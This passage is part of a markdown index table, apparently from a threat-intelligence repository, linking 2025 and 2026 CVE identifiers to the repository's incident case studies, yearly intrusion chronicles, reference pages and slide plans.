| [CVE-2025-31324](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-31324) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2025-32433](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-32433) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-32711](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-32711) | [AI Threats in the Cybersecurity Industry: A 2026 Case Study](/case-studies/AI_THREATS_2026.md) |
| [CVE-2025-33053](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-33053) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Other State-Linked Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_OTHER_STATES.md), [Slide plan: Other State-Linked Threat Actors: The Public Record](/case-studies/slides/plans/THREAT_ACTORS_OTHER_STATES.md) |
| [CVE-2025-42999](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-42999) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-43200](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-43200) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-43300](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-43300) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-43529](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-43529) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2025-49704](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-49704) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2025-49706](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-49706) | [ATT&CK Campaigns Reference](/ATTACK_CAMPAIGNS_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md) |
| [CVE-2025-52691](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-52691) | [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md), [Case Studies](/case-studies/README.md), [SmarterTools SmarterMail Exploitation and Ransomware, 2026 (CVE-2026-23760, CVE-2026-24423, CVE-2025-52691): A Case Study](/case-studies/SMARTERTOOLS_SMARTERMAIL_2026.md), [Slide plan: SmarterTools SmarterMail Exploitation and Ransomware, 2026 (CVE-2026-23760, CVE-2026-24423, CVE-2025-52691): A Case Study](/case-studies/slides/plans/SMARTERTOOLS_SMARTERMAIL_2026.md) |
| [CVE-2025-53690](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-53690) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md) |
| [CVE-2025-53770](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-53770) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Case Studies](/case-studies/README.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2025-53771](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-53771) | [Notable Cybersecurity Incidents](/NOTABLE_INCIDENTS.md), [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Case Studies](/case-studies/README.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [The SharePoint ToolShell Mass Exploitation: A 2025 Case Study](/case-studies/SHAREPOINT_TOOLSHELL_2025.md), [China-Attributed Threat Actors: The Public Record](/case-studies/THREAT_ACTORS_CHINA.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2025-54236](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-54236) | [E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/ECOMMERCE_THREATS.md), [Slide plan: E-Commerce Threats: The Public Record, 1999 to 2026](/case-studies/slides/plans/ECOMMERCE_THREATS.md) |
| [CVE-2025-55182](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-55182) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The TeamPCP Supply-Chain Campaign of 2026: Trivy, Checkmarx and the Bitwarden CLI (CVE-2026-33634)](/case-studies/TEAMPCP_TRIVY_SUPPLY_CHAIN_2026.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2025-58034](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-58034) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-59287](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-59287) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2025-59718](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-59718) | [The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md), [Case Studies](/case-studies/README.md), [Slide plan: The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/slides/plans/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md) |
| [CVE-2025-61624](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-61624) | [The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md) |
| [CVE-2025-61882](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-61882) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Slide plan: The Year 2025 in Intrusions: A Dated Record](/case-studies/slides/plans/CHRONICLE_2025.md) |
| [CVE-2025-61884](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-61884) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-64446](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-64446) | [The Year 2025 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2025.md) |
| [CVE-2025-66376](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-66376) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2025-67038](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-67038) | [Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md), [Slide plan: Industrial Control System Attacks and Advisories, 2024 to 2026: Incidents, CVEs and Attribution](/case-studies/slides/plans/ICS_ATTACKS_AND_ADVISORIES_2024_2026.md) |
| [CVE-2025-68461](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-68461) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2025-68613](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2025-68613) | [n8n](/ai-tooling/tools/N8N.md) |
| [CVE-2026-0257](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-0257) | [The ATF Major Incident of 2026: A Case Study](/case-studies/ATF_MAJOR_INCIDENT_2026.md), [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/CHECK_POINT_VPN_CVE_2026_50751.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The PAN-OS GlobalProtect Authentication Bypass of 2026 (CVE-2026-0257), Qilin and INC Ransomware: A Case Study](/case-studies/PALO_ALTO_PAN_OS_CVE_2026_0257.md), [The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/RANSOMWARE_ECOSYSTEM.md), [Case Studies](/case-studies/README.md), [Slide plan: The ATF Major Incident of 2026: A Case Study](/case-studies/slides/plans/ATF_MAJOR_INCIDENT_2026.md), [Slide plan: The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/slides/plans/CHECK_POINT_VPN_CVE_2026_50751.md), [Slide plan: The PAN-OS GlobalProtect Authentication Bypass of 2026 (CVE-2026-0257), Qilin and INC Ransomware: A Case Study](/case-studies/slides/plans/PALO_ALTO_PAN_OS_CVE_2026_0257.md), [Slide plan: The Ransomware Ecosystem: The Public Record, 2019 to 2026](/case-studies/slides/plans/RANSOMWARE_ECOSYSTEM.md) |
| [CVE-2026-1281](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-1281) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md), [Case Studies](/case-studies/README.md), [Slide plan: Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/slides/plans/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2026-1340](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-1340) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md), [Case Studies](/case-studies/README.md), [Slide plan: Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/slides/plans/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2026-1731](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-1731) | [The BeyondTrust Remote Support and PRA Command Injection of 2026 (CVE-2026-1731): A Case Study](/case-studies/BEYONDTRUST_REMOTE_SUPPORT_CVE_2026_1731.md), [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Healthcare Threat Actor Watchlist, 2023 to 2026: Who Hits Hospitals, How They Get In, and What the Record Says](/case-studies/HEALTHCARE_THREAT_WATCHLIST.md), [Case Studies](/case-studies/README.md), [Slide plan: The BeyondTrust Remote Support and PRA Command Injection of 2026 (CVE-2026-1731): A Case Study](/case-studies/slides/plans/BEYONDTRUST_REMOTE_SUPPORT_CVE_2026_1731.md) |
| [CVE-2026-2441](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-2441) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Slide plan: Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/slides/plans/CHROME_ISOLATED_WEB_APPS_2026.md) |
| [CVE-2026-3055](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-3055) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Case Studies](/case-studies/README.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md) |
| [CVE-2026-3909](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-3909) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md) |
| [CVE-2026-3910](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-3910) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [Slide plan: Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/slides/plans/CHROME_ISOLATED_WEB_APPS_2026.md) |
| [CVE-2026-5281](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-5281) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md), [Slide plan: Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/slides/plans/CHROME_ISOLATED_WEB_APPS_2026.md) |
| [CVE-2026-6973](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-6973) | [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2026-8451](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-8451) | [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [Case Studies](/case-studies/README.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md) |
| [CVE-2026-8452](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-8452) | [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md) |
| [CVE-2026-10520](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-10520) | [Ivanti EPMM Code Injection (CVE-2026-1281 and CVE-2026-1340): A Case Study](/case-studies/IVANTI_EPMM_CVE_2026_1281.md) |
| [CVE-2026-11645](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-11645) | [Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/CHROME_ISOLATED_WEB_APPS_2026.md), [Slide plan: Chrome Isolated Web Apps: Vulnerabilities and Abuse in 2026](/case-studies/slides/plans/CHROME_ISOLATED_WEB_APPS_2026.md) |
| [CVE-2026-12569](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-12569) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-15409](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-15409) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-15410](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-15410) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-16232](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-16232) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Check Point Remote Access VPN IKEv1 Authentication Bypass of 2026 (CVE-2026-50751): A Case Study](/case-studies/CHECK_POINT_VPN_CVE_2026_50751.md), [Slide plan: CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/slides/plans/CHECK_POINT_GAIA_CVE_2026_123039.md) |
| [CVE-2026-18556](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-18556) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2026-18577](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-18577) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [Major Cloud Security Incidents: The Public Record, 2011 to 2026](/case-studies/CLOUD_SECURITY_INCIDENTS.md), [Able2Shell and the RMM Attack Surface: The N-able N-central Disclosure of November 2026](/case-studies/NABLE_NCENTRAL_ABLE2SHELL_2026.md) |
| [CVE-2026-19490](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-19490) | [The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/CITRIX_NETSCALER_CVE_2026_3055.md), [The Citrix NetScaler Zero-Days of September and October 2026 (CVE-2026-88771, CVE-2026-88772, CVE-2026-88779): A Case Study](/case-studies/CITRIX_NETSCALER_SEPTEMBER_2026.md), [Slide plan: The Citrix NetScaler SAML IdP Memory Overread (CVE-2026-3055): A Case Study](/case-studies/slides/plans/CITRIX_NETSCALER_CVE_2026_3055.md) |
| [CVE-2026-20122](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20122) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md), [Slide plan: The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/slides/plans/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-20127](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20127) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md), [Case Studies](/case-studies/README.md), [Slide plan: The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/slides/plans/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-20128](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20128) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-20131](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20131) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-20133](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20133) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-20182](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20182) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md), [Case Studies](/case-studies/README.md), [Slide plan: The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/slides/plans/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-20245](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20245) | [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md), [Case Studies](/case-studies/README.md), [Slide plan: The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/slides/plans/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-20262](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20262) | [The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/CISCO_SDWAN_CVE_2026_20127.md), [Slide plan: The Cisco Catalyst SD-WAN Authentication Bypass of 2026 (CVE-2026-20127) and UAT-8616: A Case Study](/case-studies/slides/plans/CISCO_SDWAN_CVE_2026_20127.md) |
| [CVE-2026-20316](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20316) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-20700](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20700) | [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md) |
| [CVE-2026-20963](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-20963) | [Case Studies](/case-studies/README.md), [The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/SHAREPOINT_2026_EXPLOITATION.md), [Slide plan: The SharePoint Server Exploitation Waves of 2026 (CVE-2026-45659 and Successors): A Case Study](/case-studies/slides/plans/SHAREPOINT_2026_EXPLOITATION.md) |
| [CVE-2026-21509](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-21509) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md), [Case Studies](/case-studies/README.md), [Slide plan: The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/slides/plans/MICROSOFT_OFFICE_CVE_2026_21509.md) |
| [CVE-2026-21510](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-21510) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2026-21513](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-21513) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md) |
| [CVE-2026-21514](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-21514) | [File Types and Extensions Reference](/FILE_TYPES_REFERENCE.md), [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md), [Slide plan: The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/slides/plans/MICROSOFT_OFFICE_CVE_2026_21509.md) |
| [CVE-2026-21589](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-21589) | [Thirty Days of Exposure Checks: Version and Configuration Evidence from the Lab](/case-studies/EXPOSURE_CHECKS_2026_11.md) |
| [CVE-2026-21962](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-21962) | [Oracle PeopleSoft CVE-2026-35273 and the ShinyHunters Mass Exploitation of 2026: A Case Study](/case-studies/ORACLE_PEOPLESOFT_SHINYHUNTERS_2026.md) |
| [CVE-2026-22769](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-22769) | [The Dell RecoverPoint for Virtual Machines Hard-Coded Credential Zero-Day of 2026 (CVE-2026-22769): A Case Study](/case-studies/DELL_RECOVERPOINT_CVE_2026_22769.md), [Case Studies](/case-studies/README.md), [Slide plan: The Dell RecoverPoint for Virtual Machines Hard-Coded Credential Zero-Day of 2026 (CVE-2026-22769): A Case Study](/case-studies/slides/plans/DELL_RECOVERPOINT_CVE_2026_22769.md) |
| [CVE-2026-23760](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-23760) | [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md), [Case Studies](/case-studies/README.md), [SmarterTools SmarterMail Exploitation and Ransomware, 2026 (CVE-2026-23760, CVE-2026-24423, CVE-2025-52691): A Case Study](/case-studies/SMARTERTOOLS_SMARTERMAIL_2026.md), [Slide plan: SmarterTools SmarterMail Exploitation and Ransomware, 2026 (CVE-2026-23760, CVE-2026-24423, CVE-2025-52691): A Case Study](/case-studies/slides/plans/SMARTERTOOLS_SMARTERMAIL_2026.md) |
| [CVE-2026-24061](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-24061) | [The Microsoft Office Security Feature Bypass of 2026 (CVE-2026-21509) and APT28: A Case Study](/case-studies/MICROSOFT_OFFICE_CVE_2026_21509.md) |
| [CVE-2026-24423](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-24423) | [Case Studies](/case-studies/README.md), [SmarterTools SmarterMail Exploitation and Ransomware, 2026 (CVE-2026-23760, CVE-2026-24423, CVE-2025-52691): A Case Study](/case-studies/SMARTERTOOLS_SMARTERMAIL_2026.md), [Slide plan: SmarterTools SmarterMail Exploitation and Ransomware, 2026 (CVE-2026-23760, CVE-2026-24423, CVE-2025-52691): A Case Study](/case-studies/slides/plans/SMARTERTOOLS_SMARTERMAIL_2026.md) |
| [CVE-2026-24858](https://teamstarwolf.github.io/intelligence-hub/#/cve/CVE-2026-24858) | [CVE-2026-123039 and Root on the Check Point Gateway: The PHP2Shell Chain, the TSGA Implant and the ESXi Wiper of October and November 2026](/case-studies/CHECK_POINT_GAIA_CVE_2026_123039.md), [The Year 2026 in Intrusions: A Dated Record](/case-studies/CHRONICLE_2026.md), [The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md), [Case Studies](/case-studies/README.md), [Slide plan: The FortiCloud SSO Authentication Bypass of 2026 (CVE-2026-24858): A Case Study](/case-studies/slides/plans/FORTINET_FORTICLOUD_SSO_CVE_2026_24858.md) |
